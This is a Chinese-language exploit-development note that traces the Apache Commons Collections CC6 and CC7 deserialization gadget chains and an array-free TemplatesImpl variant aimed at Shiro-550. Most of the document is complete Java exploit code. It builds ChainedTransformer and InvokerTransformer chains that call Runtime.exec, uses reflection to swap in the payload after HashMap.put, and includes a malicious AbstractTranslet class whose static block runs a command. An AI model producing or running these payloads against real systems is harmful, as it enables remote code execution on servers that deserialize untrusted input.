# cc6利用过程

首先我们来过一遍利用过程
终点：InvokerTransformer.transform()->
![[Pasted image 20251207174827.png]]
到ChainedTransformer.transform()->
![[Pasted image 20251207174927.png]]
LazyMap.get()中调用了transform()->
![[Pasted image 20251207175148.png]]
TiedMapEntry.getValue()中调用了get()->
![[Pasted image 20251207175343.png]]
TiedMapEntry.hashCode()中调用了getValue()->
![[Pasted image 20251207175335.png]]
hashMap.hash()中调用了hashCode()->![[Pasted image 20251207175522.png]]
起点：
hashMap.readObject()中调用了hash方法
![[Pasted image 20251207175823.png]]

ok至此我们利用链完整，懒得再写一遍，贴个别人的图吧
![[Pasted image 20251207175913.png]]

----

# 手搓exp

我们先跟着链子写一条

对比发现不一样，细看发现这条不反序列化也会触发calc
有点类似url触发DNS请求那条链子
在put的时候
```java
package org.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.util.HashMap;  
import java.util.Map;  
  
public class Cc6Test {  
    public static void main(String[] args)throws Exception {  
  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
        };  
          
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        Map lazymap = LazyMap.decorate(new HashMap<>(), chainedTransformer);  
        TiedMapEntry tiedmapentry = new TiedMapEntry(lazymap, "aaa");  
        //tiedmapentry.hashCode();  
        HashMap<Object, Object> aaa = new HashMap<>();  
        aaa.put(tiedmapentry,"anything");  
       //serialize(aaa);  
        //unserialize("ser.bin");  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
  
  
  
}
```
put在这里提前调用了hash方法，并不是readObject中触发的。
![[Pasted image 20251207195340.png]]

所以我们核心思路就是让前面的链子断了，然后，在put之后改回来即可。
```java
package org.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.*;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
  
public class Cc6Test {  
    public static void main(String[] args)throws Exception {  
  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
        };  
          
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        Map lazymap = LazyMap.decorate(new HashMap<>(),new ConstantFactory("sb"));  
        TiedMapEntry tiedmapentry = new TiedMapEntry(lazymap, "aaa");  
        //tiedmapentry.hashCode();  
        HashMap<Object, Object> aaa = new HashMap<>();  
        aaa.put(tiedmapentry,"anything");  
  
  
        Class<LazyMap> lazyMapClass = LazyMap.class;  
        Field factory = lazyMapClass.getDeclaredField("factory");  
        factory.setAccessible(true);  
        factory.set(lazymap,chainedTransformer);  
  
        //serialize(aaa);  
        unserialize("ser.bin");  
  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
  
  
  
}
```
前面随便写，后面改回来，就这么个道理
![[Pasted image 20251207201404.png]]

但是我们发现还是有问题。打个断点进去看看
发现在这里，还有一个put，key会变成aaa

![[Pasted image 20251207210133.png]]
那我们直接给他rm就好了
```java
package org.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.*;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
  
public class Cc6Test {  
    public static void main(String[] args)throws Exception {  
  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
        };  
          
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        Map lazymap = LazyMap.decorate(new HashMap<>(),new ConstantFactory("sb"));  
        TiedMapEntry tiedmapentry = new TiedMapEntry(lazymap, "aaa");  
        //tiedmapentry.hashCode();  
        HashMap<Object, Object> aaa = new HashMap<>();  
        aaa.put(tiedmapentry,"anything");  
        lazymap.remove("aaa");  
  
        Class<LazyMap> lazyMapClass = LazyMap.class;  
        Field factory = lazyMapClass.getDeclaredField("factory");  
        factory.setAccessible(true);  
        factory.set(lazymap,chainedTransformer);  
  
        serialize(aaa);  
        unserialize("ser.bin");  
  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
  
  
  
}
```


# 优点
不受jdk版本限制
也不受cc版本限制


# CC6在4.x系列中的改造
在 commons-collections4:4.1 之后这些 Transformer 都没有实现 Serializable 接口导致无法被反序列化


CC6 链子在 `commons-collections4:4.0` 上也是存在的, 但是 LazyMap 有一个变动

`LazyMap#decorate` 方法并不存在了, 这个时候就需要我们换一个方法来创建 LazyMap 了
原来的decorate方法实际上是新建了一个LazyMap
![[Pasted image 20251209220337.png]]
新版取消了这个decorate
改为了全新的：
```java
public static <K, V> LazyMap<K, V> lazyMap(Map<K, V> map, Transformer<? super K, ? extends V> factory) { 
	return new LazyMap<>(map, factory); 
}
```
声明了是一个泛型方法
返回值是一个泛型的LazyMap<>
  **`? super K` (下限通配符):** 表示 `Transformer` 接受的输入类型可以是 `K` 或 `K` 的**任何父类型**。

 **作用:** 当 `LazyMap` 调用 `factory` 时，它会传入一个类型为 `K` 的键。这个通配符确保了 `factory` 可以处理这个键。
 
  **`? extends V` (上限通配符):** 表示 `Transformer` 返回的输出类型可以是 `V` 或 `V` 的**任何子类型**。
 **作用:** 确保 `factory` 返回的值可以安全地赋值给 `LazyMap<K, V>` 中的值类型 `V`。


所以我们可以构造exp
```java
package org.example.CC;  
  
  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.functors.*;  
import org.apache.commons.collections4.keyvalue.TiedMapEntry;  
import org.apache.commons.collections4.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
public class CC6_4_X {  
    public static void main(String[] args) throws Exception{  
        Transformer[] transformers = new Transformer[] {  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer(  
                        "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer(  
                        "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),  
                new InvokerTransformer(  
                        "exec", new Class[]{String.class}, new Object[]{"calc"}),  
                new ConstantTransformer(1)  
        };  
  
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});  
  
        Map evilMap = new HashMap();  
        Map lazyMap =  LazyMap.lazyMap(evilMap, fakeChain);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "kengwang");  
        Map expMap = new HashMap();  
        expMap.put(tiedMapEntry, "aura");  
  
// tweak  
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");  
        field.setAccessible(true);  
        field.set(fakeChain, transformers);  
  
        evilMap.remove("kengwang");  
  
  
        //return expMap;  
    }  
}
```

# 无数组改造

我们用的`ChainedTransformer`,其中包含了Transformer数组，但是在某些特殊的情况下
例如：（shiro-550）
由于shiro使用了自己实现的 ClassResolvingObjectInputStream 来进行反序列化，从而使得非Java的原生数组会反序列化失败。
解决办法有两种

1. 结合 RMI 协议来二次反序列化 (利用 JRMPClient)
2. 构造无数组形式的反序列化链

## 方法1-结合RMI协议

[针对resolveClass绕过的RMIConnector二次反序列化利用链-先知社区](https://xz.aliyun.com/news/14968)


## 方法2-无数组形式
这里我们利用的是`TemplatesImpl`
这个类的两大特点：
- **只需要一次方法调用：** 只要对 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 类的实例调用 **`newTransformer()`** 方法，就能触发其内部的恶意字节码（执行命令）。

- **不需要参数：** `newTransformer()` 是一个无参方法。
在`TemplatesImpl`中的`newTransformer()`方法中调用了
`getTransletInstance()`方法，我们跟进下
![[Pasted image 20251208225307.png]]
这里加载了字节码
![[Pasted image 20251208225454.png]]
所以我们可以直接让一个`InvokerTransformer`调用`TemplatesImpl`实例的`newTransformer()`方法
这样就可以绕过数组
### `TemplatesImpl`加载恶意字节码的前提条件
在exp之前，写一下`TemplatesImpl`加载恶意字节码的前提条件。

#### `_bytecodes`: 恶意类的字节码
这里会加载恶意字节码
![[Pasted image 20251208231642.png]]

####  `_name`: 任意非空字符串。
这里name不能为空
![[Pasted image 20251208231919.png]]
####   `_tfactory`: 必须是 `TransformerFactoryImpl` 的实例（通常是默认值）。
`newTransformer()` 内部会调用 `_tfactory.getFeature(...)` 方法。如果 `_tfactory` 为 `null`，则抛出 `NullPointerException`。
![[Pasted image 20251208232050.png]]

### 构造exp
构造`TemplatesImpl`
```java
 //Test.java生成恶意字节码
package org.example.CC.CC3;  
  
import java.io.IOException;  
  
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
  
public class Test extends AbstractTranslet{  
    static {  
        try {  
            Runtime.getRuntime().exec("calc.exe");  
        } catch (IOException e) {  
            throw new RuntimeException(e);  
        }  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
}
--------------------------------------------------------------------------------  
 //加载恶意字节码 
//反射  
TemplatesImpl templates = new TemplatesImpl();  
Class<? extends TemplatesImpl> getclass = templates.getClass();  
//_name赋值  
Field name = getclass.getDeclaredField("_name");  
name.setAccessible(true);  
name.set(templates,"anything");  
//_bytecodes赋值  
Field bytecodes = getclass.getDeclaredField("_bytecodes");  
bytecodes.setAccessible(true);  
byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\src\\main\\java\\org\\example\\CC\\CC3\\Test.class"));  
byte[][] bytes1 ={bytes};  
bytecodes.set(templates,bytes1);  
//_tfactory赋值  
Field tfactory = getclass.getDeclaredField("_tfactory");  
tfactory.setAccessible(true);  
tfactory.set(templates,new TransformerFactoryImpl());
```
后面的就和CC6普通版无异了
```java
package org.example.CC.CC6;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.*;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
public class CC6_NoArray {  
    public static void main(String[] args) throws  Exception{  
  
  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\src\\main\\java\\org\\example\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
  
  
  
  
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});  
        Transformer transformer = new InvokerTransformer("newTransformer", null, null);  
        Map evilMap = new HashMap();  
        Map lazyMap = LazyMap.decorate(evilMap, fakeChain);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);  
        Map expMap = new HashMap();  
        expMap.put(tiedMapEntry, "aura");  
        evilMap.clear();  
  
// tweak  
        Field f = LazyMap.class.getDeclaredField("factory");  
        f.setAccessible(true);  
        f.set(lazyMap, transformer);  
        serialize(expMap);  
        unserialize("ser.bin");  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}

```

思路为：
readObject->hashcode()->getValue()->调用
map.get(key)**在这里就是`lazyMap.get(templates)`**

![[Pasted image 20251208233013.png]]
`lazyMap.get()`方法里面调用了transform方法
所以，在装饰器装饰为`InvokerTransformer`后调用他的invoke，执行的方法名字为
**newTransformer**   ！！
也就是执行`templates.newTransformer()`
至此大功告成！！

[Shiro-550 反序列化分析 | X1r0z Blog](https://exp10it.io/posts/shiro-550-deserialization/)




# CC7
CC7只是改变了readObject点，通过`Hashtable.readObject`->`Hashtable.reconstitutionPut`中的hashCode()->`TiedMapEntry.hashCode()`
然后走CC6的命令执行即可

![[Pasted image 20251213161820.png]]![[Pasted image 20251213161822.png]]

## 构造exp

```java
package org.example.CC.CC7;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Hashtable;  
import java.util.Map;  
  
public class CC7Test {  
    public static void main(String[] args)throws Exception {  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});  
  
        LazyMap expMap =(LazyMap) LazyMap.decorate(new HashMap<>(), chainedTransformer);  
  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(expMap,"aaa");  
  
  
        Hashtable<Object, Object> hashtable = new Hashtable<>();  
        hashtable.put(tiedMapEntry, "anything");  
  
  
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");  
        iTransformers.setAccessible(true);  
        iTransformers.set(chainedTransformer,transformers);  
  
        expMap.remove("aaa");  
  
  
        serialize(hashtable);  
        //unserialize("ser.bin");  
  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```






